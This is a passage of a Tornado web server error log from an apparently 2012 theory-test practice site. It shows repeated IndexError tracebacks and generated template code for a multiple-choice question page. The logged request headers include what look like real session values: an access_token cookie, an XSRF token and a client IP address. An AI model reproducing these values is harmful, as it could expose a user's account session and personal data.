 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b6fb58e4c8548017fb42c&answers=%5B1%5D&cursor=0&_xsrf=c61bbcc368ff43dfae27f2c753f54e78', headers={'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '109.158.140.86', 'Origin': 'http://www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'X-Privly-Version': '0.0.7', 'Referer': 'http://www.intheory.co.uk/test/new', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3; __utma=188782963.911667569.1347965546.1348162371.1348168472.3; __utmb=188782963.13.10.1348168472; __utmc=188782963; __utmz=188782963.1347965546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 85.53ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b6fcd8e4c85480ff4f8ca&answers=%5B1%5D&cursor=0&_xsrf=c61bbcc368ff43dfae27f2c753f54e78', headers={'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '109.158.140.86', 'Origin': 'http://www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'X-Privly-Version': '0.0.7', 'Referer': 'http://www.intheory.co.uk/test/new', 'Cookie': '_xsrf=c61bbcc368ff43dfae27f2c753f54e78; access_token=QUFBRzZsTmNzNkdjQkFFSWhKSWpKdUozb2hGOUl2Y3laQmx5WkFvR2tFWkJnM0l2anROYlRTWGRzRXBvT2xaQmpUWkNIN2ZvcnI0Z2kxODV4ek5UM0VVVkU1U1lTYjdmQlpDNzRWdGp6MFpCa0FaRFpE|1348168494|73fe9013674acea9fa9ffdda155fafc5910b73a3; __utma=188782963.911667569.1347965546.1348162371.1348168472.3; __utmb=188782963.14.10.1348168472; __utmc=188782963; __utmz=188782963.1347965546.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 106.35ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
